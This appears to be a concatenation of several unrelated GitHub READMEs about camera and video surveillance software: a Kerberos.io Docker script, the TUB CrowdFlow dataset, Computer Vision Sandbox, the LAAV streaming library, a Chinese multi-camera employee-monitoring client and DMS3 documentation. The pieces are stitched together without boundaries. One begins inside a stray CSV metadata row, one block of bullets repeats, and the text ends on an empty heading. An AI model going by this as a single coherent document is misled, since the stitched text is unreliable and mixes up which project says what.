We've created a simple and small tool to auto provision and auto configure the Kerberos agents. The idea is that you define the different configurations for every camera upfront (/environments directory), and map them to into your Docker container (using volumes). The ultimate goal is to have a fully automated for provisioning your Kerberos agents in just a matter of seconds. It's also a great way to backup your security configuration.

    CAMERA 1 <<== CONTAINER1 <<== environment/cameraconfig1
    CAMERA 2 <<== CONTAINER2 <<== environment/cameraconfig2
    CAMERA 3 <<== CONTAINER2 <<== environment/cameraconfig3

### How to use it?

The tool we've created is a simple bash script which we called **dockeros**, and exposes a couple of methods; discussed below. By specifying a number of parameters, **dockeros** will do all the magic dockering for you. This tool is still work in progress, so PR's and new features are welcome!

    git clone https://github.com/kerberos-io/docker
    cd docker/bin
    ./dockeros.sh {command}

### Commands

List all kerberos.io containers which are created.

    ./dockeros.sh showall


Remove all kerberos.io containers which were created before.

    ./dockeros.sh cleanup

Create a kerberos.io container with a name and predefined configuration.

    ./dockeros.sh create {name} {config} {webport} {streamport}

* **name**: This is the name of the container which will be created.

* **config**: The configuration which needs to be injected in the container. The configuration directories can be found in the **/environments** folder.

* **webport**: The port on which the webinterface will be served.

* **streamport**: The port on which the livestream will be served.

### Buildx

    docker run --rm --privileged docker/binfmt:66f9012c56a8316f9244ffd7622d7c21c1f6f28d

## TUB CrowdFlow Dataset
Optical Flow Dataset and Evaluation Kit for Visual Crowd Analysis developed at [Communication Systems Group](https://www.nue.tu-berlin.de/) at TU-Berlin desciribed in the AVSS 2018 paper 
[Optical Flow Dataset and Benchmark for Visual Crowd Analysis](http://elvera.nue.tu-berlin.de/files/1548Schr%C3%B6der2018.pdf) or [TUBCrowdFlow@arxiv.org](https://arxiv.org/abs/1811.07170). 

The Dataset contains 10 sequences showing 5 scenes. Each scene is rendered twice: with a static point of view and a dynamic camera to simulate drone/UAV based surveillance. We render at HD resolution (1280x720) at 25 fps, which is typical for current commercial CCTV surveillance systems. The total number of frames 3200.

For each sequence we provide the following **ground-truth** data:
 * **Optical flow fields** 
 * **Person trajectories (up to 1451)**
 * **Dense pixel trajectories**

### Installation
Minimum required python version: 3.5

**Install dependencies on Ubuntu:**
```
sudo apt-get install python3-dev python3-virtualenv virtualenv
```
Create a virtual environment and install python requirements:
```
virtualenv -p python3 crowdflow_env
source crowdflow_env/bin/activate
pip3 install numpy progressbar2 opencv-contrib-python
```

## Evaluation Framework
To evaluate an optical flow method with the providen framework perform these step:
 * create a new directory in the `/TUBCrowdFlow/estimate` directory. 
 * compute flow fields and save them in *.flo* fileformat with the structure given in by the 
 `/TUBCrowdFlow/images` directory.  For example optical flow results from the image pair  `/TUBCrowdFlow/images/IM01/frame_0000.png` and `/TUBCrowdFlow/images/IM01/frame_0001.png`
 must be stored as `/estimate/[mymethod]/images/IM01/frame_0000.flo
 * run `opticalflow_evaluate.py` to compute EPE and R2 short-term metrics.
 * run `trajectory_evaluate.py` to compute tracking accuracy long-term metrics.

**Optical Flow Samples**

`
opticalflow_estimate.py <dataset_root_path> <flow_method_name_1> <flow_method_name_2> ...
`

With the following program optical flow fields for the TUB CrowdFlow dataset will be estimated with Dual-TVL1.
```
source crowdflow_env/bin/activate
python3 opticalflow_estimate.py TUBCrowdFlow/ dual farneback plk
```
The optical flow files will be stored in the directory `/estimate/dual/` . 

**Short-Term Evaluation**

Short-term evaluation performs classical approch for optical flow evaluation, i.e. measures based on ground-truth optical flow fields (e.g. end-point error, RX measures)

`
opticalflow_evaluate.py <dataset_root_path> <dir_name_method_1> <dir_name_method_2> ... <dir_name_method_n> 
`

Example:
```
source crowdflow_env/bin/activate
python3 opticalflow_evaluate.py TUBCrowdFlow/ dual plk farneback
```
After execution the file *short_term_results.tex* will contain the evaluation results (*method 1 - method n*) in form of a latex table.
*short_term_results.pb* will contain the evaluation results stored with pickle.

**Long-Term  Evaluation**

Long-term evaluation performs evaluation based on ground-truth trajectories, i.e. **person trajectories** and **dense pixel trajectories** (see paper).

`
trajectory_evaluate.py <dataset_root_path> <dir_name_method_1> <dir_name_method_2> ... <dir_name_method_n>
`

Example:
```
source crowdflow_env/bin/activate
python3 trajectory_evaluate.py TUBCrowdFlow/ dual plk farneback 
```
After execution the file *long_term_results.tex* will contain the evaluation results (*method 1 - method n*) in form of a latex table.
*long_term_results.pb* will contain the evaluation results stored with pickle.

## Results
To assess the quality of the optical flow we propose to use two types of metrics: i) common optical flow metrics, i.e. average endpoint error (EPE) and percentage of erroneous
pixel (RX) and ii) long-term motion metrics based on trajectories. An detailed overview of the optical flow parameters can be found in the document: [Supplemental_materials.pdf](./Supplemental_material.pdf)).

# Computer Vision Sandbox

Computer Vision Sandbox is a software package, which aims to allow solving different tasks related to computer vision areas, like, for example, video surveillance, vision based automation/robotics, different sorts of image/video processing, etc.

The idea of the software is its great modularity. The main application itself does little on its own - it represents a building platform. However, being combined with the vast range of plug-ins it may accomplish great range of tasks. Plug-ins represent building blocks and the type of blocks chosen and the way those are used determine what the software does. The idea is to provide users with a building platform and let them construct their goal.

So, what are the plug-ins? Since it is all around computer vision, the video source plug-ins play the central role in the system. There are plug-ins to access different types of cameras, like USB web cameras, video capture boards, IP video surveillance cameras, etc. Once video is received, there is great variety of plug-ins to perform different image and video processing. Combined together those allow achieving many interesting results. On top of that, there is scripting support, which allows to do even more by programming custom scripts utilizing the variety of plug-ins. Future releases will extend scripting API even more, bring more image/video processing plug-ins and introduce device plug-ins to talk to some robotics boards/controllers and other hardware - this is when the real fun comes.

So, to repeat, it is all about building blocks and connecting them to solve the task. And if the system does not talk to certain camera model, does not perform some required image or video processing, etc. - add a plug-in and it will do so. Well, this is the goal. 

Below is a quick screen shot of the Computer Vision Sandbox showing six different IP cameras:
![Cameras View](images/cvsandbox.jpg)

Another one from a different area - locating and counting objects of different colors:

paolo-pr,laav,,https://github.com/paolo-pr/laav,https://api.github.com/repos/laav/paolo-pr,"Asynchronous Audio / Video Library for H264 / MJPEG / OPUS / AAC / MP2 encoding, transcoding, recording and streaming from live sources","# Live Asynchronous Audio Video Library

## ABOUT

A header-only **C++** library which wraps [FFmpeg](https://ffmpeg.org/), [V4L2](https://linuxtv.org/), [ALSA](https://www.alsa-project.org) and [Libevent](http://libevent.org/) for capturing audio and video from multiple live sources (cameras and microphones) and

* Encoding (video: **H264**, audio: **AAC**, **MP2** and **OPUS**)
* Decoding (video: **MJPEG**) / transcoding (video: **MJPEG** -> **H264**)
* Recording to file (**MPEGTS** and **MATROSKA** containers, audio and/or video)
* Streaming (**HTTP** and **UDP** protocols for **MPEGTS** and **MATROSKA** containers)
* Basic image processing

The project is useful for building **video surveillance** systems as well, consisting in media servers which stream and record at the same time and which can be controlled through **MQTT** or **HTTP** commands (see **[THIS](https://github.com/paolo-pr/laav/blob/master/mqtt-avsystem/README.md)** and **[THIS](https://github.com/paolo-pr/laav/blob/master/examples/VideoExample_2.cpp)** examples).

The project runs on **Linux** (**ALSA** and **V4L2** devices), but a Windows port is planned (any contribution is welcome!).

## FEATURES

* All the audio/video tasks are made with **strictly asynchronous** multiple **pipes**, inside one main loop. This allows to create **simple**, **short** (a complete live H264 grabber/streamer can be made with less than 40 lines of code, see **[THIS](https://github.com/paolo-pr/laav/blob/master/examples/VideoExample_1.cpp)** example), **easy to read** and **intuitive** code in which all the pipes can be realized through overloaded operators, in the following form:

```
while (!LAAVStop)
{
    // Pipe
    grabber >> converter >> encoder >> streamer;
    
    // Audio-video events catcher
    eventsCatcher->catchNextEvent();
}
```

* **Threads are not used at all** and they are intentionally discouraged in order to avoid that they can be improperly used for decoupling tasks, without taking advantage from multi-core systems.
* All the audio/video modules (-> classes) make **extensive use of templates** and all their possible concatenations are checked at **compile-time**, so to avoid inconsistent pipes.
* All the pipes are **safe at runtime**. I.E: when a source is disconnected or temporarily unavailable, the main loop can continue without necessarily having to check errors (they can be checked, anyway, by polling the status of each node: see **[THIS](https://github.com/paolo-pr/laav/blob/master/examples/AudioVideoExample_2.cpp)** example)
* The library is all RAII-designed (basically it safely wraps Libavcodec/format, V4L and ALSA) and **the user doesn't have to bother with pointers and memory management**.
* The public API is intended to be intuitive, with a few self-explanatory functions.

## COMPILING / RUNNING

Dependencies: **[FFmpeg](https://ffmpeg.org/)** >= **5.0** (tested with **5.0** version), **[Libevent](http://libevent.org/)** and pkg-config (optional: see the compile command below).
**[FFmpeg](https://ffmpeg.org/)** needs **[x264](http://www.videolan.org/developers/x264.html)** for H264 support and **[libopus](http://opus-codec.org/)** for OPUS support.

* Include the library global header (LAAV.hpp), as shown in the [examples](https://github.com/paolo-pr/laav/tree/master/examples), in YourProgram.cpp and execute:
```
g++ -Wall -std=c++11 -DLINUX -o YourProgram YourProgram.cpp `pkg-config --libs libavformat libavcodec libavutil libswresample libswscale libevent alsa`
```
* Execute ./CompileExamples for compiling the provided examples.
* API documentation in HTML format can be created by executing, inside the doxy directory:
```
doxygen Doxyfile
```
The library has been tested with the **[VLC](http://www.videolan.org/)**, **[FFPLAY](https://ffmpeg.org/)** and **[MPV](https://mpv.io/)** media players, but other players should work as well.
In order to reduce the network streams' latency, use the following flags on the client side:

VLC (tested with v2.2.4: set a low value for --network-caching flag):
```
vlc --network-caching 200 http://stream_url
```
FFPLAY:
```
ffplay -fflags nobuffer http://stream_url
```

## HOW TO USE IT

See the provided **[EXAMPLES](https://github.com/paolo-pr/laav/tree/master/examples)**

## TODO

* Improve the compile-time error messages, for inconsistent pipes, with more static_assert(...) calls.
* Add a RTSP/RTP streaming server.
* Windows port (basically, it will consist in creating Windows based classes corresponding to the ALSAGrabber and V4L2Grabber classes, with the same API, and few other things: any contribution is welcome!).
* MPEGTS-MJPEG is currently NOT supported.

## 需求分析
假设一个业务场景：每个员工工位旁有两个网络摄像头。老板需要一个员工监控软件，在上班时软件可以拉取RTSP视频流，也可以随时录制视频。这样老板就可以知道谁在摸鱼了 ◕‿◕  
为防有人上纲上线，在此特别声明：上面的场景是开玩笑的。监控软件有很多使用场景：学校，公安，交通，考试，零售等等。

## 功能
* 支持画面按人数分页（8/12/24/28），默认24人画面  
* 支持单人切换大屏（鼠标右键）  
* 可同时播放和录制48路视频  
* 支持GPU解码和渲染  

## UI
单页24人
![](./screenshot/48smallScreen.png)
3页，每页8人
![](./screenshot/16smallScreen.png)
单人大屏
![](./screenshot/bigScreen.png)

## 使用
目前配置文件`BetaVideoMonitorClient.ini`可配置两路地址：leftUrl和rightUrl，24人共用这两个地址。  
leftUrl=rtsp://user:password@192.168.1.20:554/Streaming/Channels/101
rightUrl=rtsp://user:password@192.168.1.20:554/Streaming/Channels/101

如果你没有网络摄像头，可以用在线HTTP地址测试，例如：
https://media.w3.org/2010/05/sintel/trailer.mp4

## 技术实现
* 界面实现用Qt  
* 拉流解码播放用FFmpeg  
* 大屏播放和视频存储用IPC主码流，小屏播放用IPC子码流  
* 使用DXVA2+D3d9实现纯GPU解码渲染  

## 环境依赖
### windows
VS：推荐VS2019以后的版本  
Qt：推荐Qt5.12以后的版本  
  
解决方案仅支持64位的Debug/Release，32位可自行适配

## 配置文件说明
* [Common]  
  * ReduceAnalyzeTime 设为1可快速打开播放器  
  * APageSeatCnt 主界面默认显示多少人画面  
* [Volatile]  
  * RecordPath 录制视频保存路径  
  * GpuAccelerated =1启用GPU加速  
  * GpuScreenCnt 使用GPU加速的小屏数量  
* [Url]  
  * leftUrl 左窗口输入url，24人共用该URL
  * rightUrl 右窗口输入url，24人共用该URL


## TODO
- [x] GPU解码和渲染

## 存在问题
IPC拉流一般有数量限制，我的IPC支持最多6路拉流解码，没有多余的IPC测试，可用HTTP地址测试。  
小屏目前是相同URL共用1路解码资源，CPU模式下可以用单个URL测试48窗口。而GPU解码渲染不支持复用URL，GPU解码渲染想测试多路需要改代码。

</p>

- The **DMS<sup>3</sup>Mail** component gets a significant makeover in response to ongoing changes in the use of advanced progressive HTML5 email templates developed to work with myriad end-user email applications. Upgrades to **DMS<sup>3</sup>Mail** include:
  - **NEW!** A much-anticipated and fully configurable HTML5 email template, based on the very popular [Cerberus responsive email patterns](https://github.com/TedGoas/Cerberus). For use in **DMS<sup>3</sup>**, we integrated the [Go HTML/template package](https://pkg.go.dev/html/template) into the Cerberus fluid template, very similar to what we did when creating the **DMS<sup>3</sup>Dashboard** component. This new responsive email template now presents a more complete email message to the end user, with the following functionality:
    - **NEW!** Larger image attachments are now integrated directly into the email body (versus as an attachment)
    - **NEW!** More complete metrics now presented in the email for each security event, including the hostname of the **DMS<sup>3</sup> Client** component sourcing the event.
    - **NEW!** The percentage of changes (in pixels) is now provided, thanks to a new *GetImageDimensions()* routine that provides image details as **DMS<sup>3</sup>Mail** processes the security event in real-time.
    - As part of this new progressive email template, email ""dark mode"" is now handled automatically, making it easier to view email on disparate mobile platforms

### **DMS<sup>3</sup>Dashboard**

</p>

Ever wonder if your surveillance cameras are operational, in need of updates, or even a reboot? The **DMS<sup>3</sup>Dashboard** component can be enabled to run on a **DMS<sup>3</sup>Server** and provide regularly-updated information of all **DMS<sup>3</sup>Client** components with device metrics that include:

- Hostname
- Hardware platform and operating system
- Kernel version
- Current **DMS<sup>3</sup>Server** and all reporting **DMS<sup>3</sup>Client** components' uptime
- Count of **DMS<sup>3</sup>Clients** reporting to the **DMS<sup>3</sup>Server**
- Count of surveillance events generated by **DMS<sup>3</sup>Clients** components
- Date/time (ISO 8601) the component last reported to the **DMS<sup>3</sup>Server**

Additionally, **DMS<sup>3</sup>Dashboard** provides a quick visual health check of all **DMS<sup>3</sup>Client** components, using color-sensitive component icons, where:

- <span style=""color:green"">**Green**</span>: a **DMS<sup>3</sup>Client** has reported to the server within an expected period of time (as configured)
- <span style=""color:orange"">**Yellow**</span>: a **DMS<sup>3</sup>Client** is late in reporting, exceeding its configured reporting interval
- <span style=""color:red"">**Red**</span>: a **DMS<sup>3</sup>Client** has not reported to the server, and requires attention

The **DMS<sup>3</sup>Dashboard** component is written using [Go's HTML templating package](https://pkg.go.dev/html/template), making it very easy to integrate new or existing HTML template themes into the component. The template used by **DMS<sup>3</sup>Dashboard** is based largely on the following resources:

- [Creative Tim's Paper Dashboard Theme](https://github.com/creativetimofficial/paper-dashboard)
- Fonts provided by [Icomoon](https://icomoon.io/)

New for this release are the following additional configuration options for **DMS<sup>3</sup>Dashboard**:

- **NEW!** Independently configurable client icon status option timeouts (warning, danger, missing) visually provide a status of a **DMS<sup>3</sup>Client** health in real-time
- **NEW!** Option to make **DMS<sup>3</sup>Server** always first in the set of **DMS<sup>3</sup>Client** devices displayed in the dashboard
- **NEW!** Option to alphabetically sort **DMS<sup>3</sup>** devices displayed in the dashboard
- **NEW!** Reporting a more comprehensive--and now dynamically updated--list of **DMS<sup>3</sup>** device attributes, including:
  - Operating system name and version release (*e.g.,* Raspbian GNU/Linux 10)
  - Hardware platform (*e.g.,* Linux ARM7l)
  - Kernel release (*e.g.,* 5.10.63-v7+)
- **NEW!** Various additional upgrades to the dashboard HTML template, including revisions to the template display, and updates to use the new **DMS<sup>3</sup>** logo in the template header

### **DMS<sup>3</sup>Server** & **DMS<sup>3</sup>Client**
  
- Both of these **DMS<sup>3</sup>** components received a significant upgrade that includes:
  - A revision to the **DMS<sup>3</sup>** component codebase, moving from [Go 1.8 to Go 1.17](https://go.dev/doc/devel/release), bringing with this language release update numerous new low-level packages, platform performance optimizations, and security enhancements
  - The addition of the ARM8 platform type (great news for Raspberry Pi and related SBC users), automatically incorporated into our native **DMS<sup>3</sup>Build** process
    - As part of the **DMS<sup>3</sup>Build** process, the remote installers have been rewritten to abstract away specific Linux dependencies
  - Revised overall project structure to reflect idiomatic Go principles
    - Commands now organized into a `cmd` folder, while configuration files are now managed in a `config` folder
    - Project moved from use of the `gocode` process to using `gopls`
    - Project migration over to the use of [Go modules](https://go.dev/ref/mod)
  - System-level service (daemon) calls are now abstracted away to work on across a broader array of Unix-like operating systems
  - **DMS<sup>3</sup>Server** listening port moved from the previous registered port range into the more appropriate dynamic/private range
  - All [TOML](https://github.com/toml-lang/toml) configuration files revved from 0.4.0 and validated ([tomlv](https://github.com/BurntSushi/toml/tree/master/cmd/tomlv)) to 1.0.0

**Distributed Motion Surveillance Security System (DMS<sup>3</sup>)** is a [Go-based](https://golang.org/ ""Go"") application that integrates third-party open-source motion detection applications (*e.g.*, the [Motion](https://motion-project.github.io/ ""Motion"") motion detection software package, or [OpenCV](http://opencv.org/ ""OpenCV""), the Open Source Computer Vision Library) into a distributed motion surveillance system that:

- Senses when someone is ""at home"" and when someone is ""not at home"" and **automatically enables or disables the surveillance system**
- Through the **DMS<sup>3</sup>Server**, coordinates video stream processing, reporting, and user notification to capable ""smart"" device clients, running the **DMS<sup>3</sup>Client** component (*e.g.*, a Raspberry Pi) which:
  - Greatly minimizes network congestion, *particularly during high-bandwidth surveillance events of interest*
  - Better utilizes smart device client CPU/GPU processing power: keeping stream processing ""on-board"" and distributed around the network
- Optionally, **DMS<sup>3</sup>Clients** can report events of interest via email using the available **DMS<sup>3</sup>Mail** component
- Optionally, the **DMS<sup>3</sup>Server** can display the current state of all reporting **DMS<sup>3</sup>Clients** visually through the use of the **DMS<sup>3</sup>Dashboard** component
- Works cooperatively with legacy ""less smart"" device clients such as IP cameras (wired or WiFi), webcams, and other USB camera devices

## **DMS<sup>3</sup>** Features

### **DMS<sup>3</sup>Client**, **DMS<sup>3</sup>Server**, and **DMS<sup>3</sup>Dashboard** Features

- Support for the **DMS<sup>3</sup>Dashboard** component, allowing for the easy, visual monitoring of all **DMS<sup>3</sup>Client** devices managed by a **DMS<sup>3</sup>Server** component
  - Mobile first, responsive, web-based design
  - Uses [Go's HTML templating package](https://pkg.go.dev/html/template) to simplify Go/HTML integration
  - Easily integrate 3rd-party configurable HTML website templates

- *Always On* feature starts/stops the motion detection application based on time-of-day (*e.g*., can enable video surveillance during nighttime or specific holiday hours)
- Device clients can be custom-configured to process and respond to surveillance events independently and uniquely (*e.g.*, an outdoor IR camera device only sends email during nighttime hours)
- Optionally play separate audio file(s) on surveillance system enable and disable
- Configurable event logging
  - INFO, ERROR, FATAL, and DEBUG log levels
  - Persist logs to file or send to STDOUT (terminal)

  - Configurable event logging
    - INFO, ERROR, FATAL, and DEBUG log levels
    - Persist logs to file or send to STDOUT (terminal)

### Motion Detection Application Support

While **DMS<sup>3</sup>** is primarily responsible for monitoring user proxies and determining when to enable or disable the surveillance system, *it alone does not manage the processing of video stream data*. That complex real-time task is left to motion detection libraries/applications which can be integrated directly into **DMS<sup>3</sup>**.

- Support for the [Motion](https://motion-project.github.io/ ""Motion"") motion detector software package

  - Movement detection support of video devices. See [this list](https://github.com/Motion-Project/motion/wiki/Supported-hardware ""Device Compatibility"") for video device compatibility. Note that **DMS<sup>3</sup>** was developed and tested using smart device clients running [Motion](https://motion-project.github.io/ ""Motion"") with native camera support (*e.g.*, a Raspberry Pi with an on-board camera module)

- Support for the [OpenCV](http://opencv.org/ ""Open Source Computer Vision Library"") Library [planned]

  - [OpenCV](http://opencv.org/ ""Open Source Computer Vision Library"") support is highly anticipated, but still experimental, though the current **DMS<sup>3</sup>** codebase cleanly abstracts away any specific motion detection application dependencies so it is anticipated to be a very straightforward integration

### Support for ""Smart"" and ""Less Smart"" Device Clients

**DMS<sup>3</sup>** is designed to utilize intelligent IoT devices, called **Smart Device Clients (SDCs)**, while still supporting less intelligent, single-purpose devices, called **Less Smart Device Clients (LSDCs)**.

- **DMS<sup>3</sup> Smart Device Clients (SDCs)** are hardware devices capable of processing local video streams for motion detection on-board, with dedicated hardware. Most computers and smaller single board computers (IoT SBCs) would be classed as smart device clients, including:
  - Raspberry PIs (**DMS<sup>3</sup>** was tested with the RaspPi Model 2, Model 3, and Pi Zero W) with a configured on-board camera module
  - Any IoT single board computer (SBC) capable of running a Unix-like operating system
  - Personal computers with a camera and wired or wireless (WiFi) connectivity

- **DMS<sup>3</sup> Less Smart Device Clients (LSDCs)** are hardware devices--typically purpose-built--unable to process motion detection video streams locally. These devices usually generate raw real-time video data, which is then sent, consumed and processed by an external device(s), oftentimes wirelessly across a network. Some examples of LSDCs include:

  - IP cameras (*e.g.*, the [Nest Cam](https://nest.com/cameras/ ""Google Nest"")), either wired or wireless
  - Webcams, typically using USB connections and run from a laptop or desktop computer

## **DMS<sup>3</sup>** Use Cases

### ""Leaving Home, Coming Home""

At its core, **DMS<sup>3</sup>** sensing relies on the concept of a *user proxy*. In this context, *a user proxy is any device representing a user that can be sensed on a home network*. A smartphone is an excellent user proxy, assuming that a user's smartphone is active on the home network when the user is ""at home,"" and drops from the network when the user leaves and is then ""not at home.""

This concept can extend to multiple user proxies, making it possible for **DMS<sup>3</sup>** to keep a surveillance system disabled until everyone in an entire family has left home: once the last registered user proxy is no longer sensed on the home network, **DMS<sup>3</sup>** automatically enables the surveillance system.

The reverse is true as well: **DMS<sup>3</sup>** will keep the surveillance system enabled only until the first user proxy is seen on the home network (*e.g.,* someone pulling into the driveway), at which time **DMS<sup>3</sup>** will automatically disable the surveillance system.

### ""Nighttime Surveillance""

In addition to sensing user proxies, **DMS<sup>3</sup>** can be configured to keep a surveillance system enabled for a specific periods of time. Called *Always On*, this **DMS<sup>3</sup>** feature works as an override for sensing user proxies: regardless of whether **DMS<sup>3</sup>** senses a user proxy on the network, as long as the time-of-day policy is met, **DMS<sup>3</sup>** will enable the surveillance system.

This feature is particularly useful for nighttime surveillance, when users may be asleep and/or smartphones may be turned off. For example, **DMS<sup>3</sup>** can be configured to turn a surveillance system on at 2330, and stay on until 0500 the next morning. During this time, **DMS<sup>3</sup>** will remain operational and monitor (and report) surveillance events as they occur.

## **DMS<sup>3</sup>** Components

**DMS<sup>3</sup>** is organized into the following application components:

- **DMS<sup>3</sup>Server**: integrated server-side system services that determine whether to enable/disable the surveillance system, and regularly notifies participating **DMS<sup>3</sup>** device clients of that surveillance state. A **DMS<sup>3</sup>Server** is typically instantiated on a headless server or home desktop computer
- **DMS<sup>3</sup>Client**: client-side endpoint services that start/stop the locally-installed motion detection application (*e.g.*, [Motion](https://motion-project.github.io/ ""Motion"")). Any number of **DMS<sup>3</sup>Client** clients can exist as part of the **DMS<sup>3</sup>** surveillance system. **DMS<sup>3</sup>Clients** are typically installed on IoT hardware (*e.g.,* Raspberry PI or similar SBC devices)
- **DMS<sup>3</sup>Dashboard**: an optional component that permits for the visual display and real-time status of **DMS<sup>3</sup>Client** components through a web browser
- **DMS<sup>3</sup>Libs**: a set of related shared libraries used for managing **DMS<sup>3</sup>** client-server services including low-level system and networking commands, system logging, and unit testing

Optional for smart device clients configured to use the [Motion](https://motion-project.github.io/ ""Motion"") motion detection application:

- **DMS<sup>3</sup>Mail**: a separate, configurable **DMS<sup>3</sup>** component for generating and sending an email in real-time whenever a client running [Motion](https://motion-project.github.io/ ""Motion"") generates a significant security event

## **DMS<sup>3</sup>** Architecture

**DMS<sup>3</sup>** is patterned after a [client server model](https://en.wikipedia.org/wiki/Client%E2%80%93server_model ""client server model""), where the **DMS<sup>3</sup>Server** component is centrally responsible for the logic of enabling/disabling the video surveillance system, while each participating smart device client (SDC), through the use of the **DMS<sup>3</sup>Client** component, is responsible for starting/stopping the locally-installed motion detection application. For ""less smart"" device clients (LSDCs), the processing of video stream data is passed over the wire to the server for processing and eventual system response and/or user notification.

In the example presented at the start of this document, one IP camera device, one IoT SBC device (a Raspberry Pi), and one webcam device are managed through the **DMS<sup>3</sup>Server** component (using the [TCP protocol](https://en.wikipedia.org/wiki/Transmission_Control_Protocol ""TCP protocol"")). The **DMS<sup>3</sup>Server** determines when to enable/disable the surveillance system, and notifies each participating device client running their own local instance of the **DMS<sup>3</sup>Client** component. Since the Raspberry Pi can be configured to run a local instance of a motion detection application, actual video stream processing, imaging, and eventual reporting is all done locally, greatly limiting network congestion.

The webcam device and the IP camera device--both less smart device clients (LSDCs), incapable of on-board stream processing--must pass raw stream data along to a device proxy running a **DMS<sup>3</sup>Client** component, which then applies motion detection processing on the incoming video streams.

## How **DMS<sup>3</sup>** Works

### **DMS<sup>3</sup>Server** Operation

The **DMS<sup>3</sup>Server** component is responsible for signaling the logic of enabling/disabling the video surveillance system to all device client endpoints. That is, the **DMS<sup>3</sup>Server** sends either a `Start` or a `Stop` message to all **DMS<sup>3</sup>** device clients configured with a **DMS<sup>3</sup>Client** component, listening on the network.

**DMS<sup>3</sup>Server** does this by periodically scanning the network for the existence of registered user proxies. This device can be anything that exposes its MAC address on the network (*e.g.,* a mobile phone on a home LAN). If that device is found on the network, it's assumed that ""someone is home"" and so **DMS<sup>3</sup>Server** sends out a `Stop` message to all participating device clients, and their respective motion detection application is subsequently stopped (if currently running).

If that user proxy then ""leaves"" and is no longer found on the network, it's assumed that ""nobody is home"", and the **DMS<sup>3</sup>Server** sends out a `Start` message to all participating device clients, and the motion detection application on that client is started (if currently stopped). Similar logic is used in the reverse case: when a user proxy is once again ""back home,"" the motion detection application of each device client is signalled to `Stop`.

Alternatively, the *Always On* feature uses time-of-day to enable/disable the surveillance system. The **DMS<sup>3</sup>Server** will look at the time range specified, and if the current time falls between the time range, the motion detection application of all client devices will be started. Once the current time falls outside of the specified time range, the motion detection application for each device client is then stopped.

### **DMS<sup>3</sup>Client** Operation

#### Running on Smart Device Clients (SDCs)

The **DMS<sup>3</sup>Client** component runs on each configured smart device client endpoint, and is responsible for starting/stopping its locally installed motion detection application. The **DMS<sup>3</sup>Client** does this by periodically listening to the configured **DMS<sup>3</sup>Server** at the pre-configured IP address and port (network socket address). When the **DMS<sup>3</sup>Client** receives a change in motion detection application state, it either starts or stops its locally-installed motion detection application.

#### Running with Less Smart Device Clients (LSDCs)

In instances where the device client is ""less smart"" and unable to process motion detection in local video streams, an LSDC instead passes motion detection processing to a **DMS<sup>3</sup>Client** proxy. Multiple LSDCs can be served by a single **DMS<sup>3</sup>Client** proxy. This proxy is then responsible for the operations of a typical **DMS<sup>3</sup>Client**.

### **DMS<sup>3</sup>Client** / **DMS<sup>3</sup>Server** Work Flow

Operationally, the **DMS<sup>3</sup>Server** and all **DMS<sup>3</sup>Client** device clients work together to establish a synchronized video surveillance state across all endpoints:

- **DMS<sup>3</sup>Server**: usually configured as a daemon running on a central server, walks a logic tree whenever a client connects (or re-connects) to the server. **DMS<sup>3</sup>Server** is responsible for answering the question *""should the surveillance system be enabled or disabled right now?""*
- **DMS<sup>3</sup>Client**: usually configured as a daemon that runs on each of the participating smart device clients, a **DMS<sup>3</sup>Client** regularly polls (at a configurable interval) the **DMS<sup>3</sup>Server**, and receives from the **DMS<sup>3</sup>Server** the current motion detection application state (called *MotionDetectorState*), that is, whether the locally installed motion detection application should be started or stopped

The activity diagram below shows the work flow of these two components:

<p align=""center"">
  <img src=""https://user-images.githubusercontent.com/10182110/150865977-cd236155-923a-47de-9d76-ff2052b3c11d.png"" alt=""DMS3 Activity Diagram"">
</p>

### **DMS<sup>3</sup>Mail** Operation

When using [Motion](https://motion-project.github.io/ ""Motion""), **DMS<sup>3</sup>Mail** is a feature written for **DMS<sup>3</sup>** that allows for the creation and sending an email whenever a valid capture event is triggered in [Motion](https://motion-project.github.io/ ""Motion""). **DMS<sup>3</sup>Mail** is very tightly integrated into [Motion](https://motion-project.github.io/ ""Motion""), where image and video capture events are identified, analyzed, and processed. **DMS<sup>3</sup>Mail** is triggered by the  [`on_picture_save`](https://motion-project.github.io/motion_config.html#on_picture_save) and the [`on_movie_end`](https://motion-project.github.io/motion_config.html#on_movie_end) commands in [Motion](https://motion-project.github.io/ ""Motion"").

> **Note:** the optional **DMS<sup>3</sup>Mail** component is called by neither **DMS<sup>3</sup>Client** nor **DMS<sup>3</sup>Server**. Instead, **DMS<sup>3</sup>Mail** is called directly by the [Motion](https://motion-project.github.io/ ""Motion"") motion detection application.

The syntax for these [Motion](https://motion-project.github.io/ ""Motion"") commands are:

```text
<on_picture_save|on_movie_end> <absolute path to dms3mail> -pixels=%D -filename=%f
```

Once configured, **DMS<sup>3</sup>Mail** will respond to these two [Motion](https://motion-project.github.io/ ""Motion"") event [hooks](http://en.wikipedia.org/wiki/Hooking ""Hooking""), and an email will be generated and sent out with an image file or video clip capturing the surveillance event of interest.

## **DMS<sup>3</sup>** Requirements

- In order to compile the **DMS<sup>3</sup>** project components, an operational Go environment is required (this version of **DMS<sup>3</sup>** was developed using Go 1.17)
- A Unix-like operating system installed on the server and smart device client (SDC) endpoints
- While **DMS<sup>3</sup>** was written and tested under Linux (Ubuntu 17.04+, and various Debian and Raspian releases), there should be no reason why **DMS<sup>3</sup>** won't work under other Linux distributions
- A motion detection application, such as [Motion](https://motion-project.github.io/ ""Motion""), correctly installed and configured with appropriate video devices configured on all smart device clients
- Specific Unix and Unix-like commands and tools used by **DMS<sup>3</sup>** components include:
  - [aplay](http://en.wikipedia.org/wiki/Aplay ""aplay""): ALSA audio player (optional)
  - [bash](https://en.wikipedia.org/wiki/Bash_(Unix_shell) ""bash""): a Unix shell and command language
  - [cat](https://en.wikipedia.org/wiki/Cat_(Unix) ""cat""): a standard Unix utility that reads files/input and writes them to standard output
  - [env](https://en.wikipedia.org/wiki/Env ""env""): Unix shell command to run a program in an altered environment
  - [grep](http://en.wikipedia.org/wiki/Grep ""grep""): globally search a regular expression and print
  - [ip](https://linux.die.net/man/8/ip ""ip""): displays or manipulate routing, devices, policy routing, and tunnels
  - [pgrep](http://en.wikipedia.org/wiki/Pgrep ""pgrep""): globally search a regular expression and print
  - [ping](http://en.wikipedia.org/wiki/Ping_(networking_utility) ""ping""): ICMP network packet echo/response tool
  - [pkill](https://en.wikipedia.org/wiki/Pkill ""pkill""): globally search a regular expression and send signals to a process

### Wifi MAC Randomization Techniques

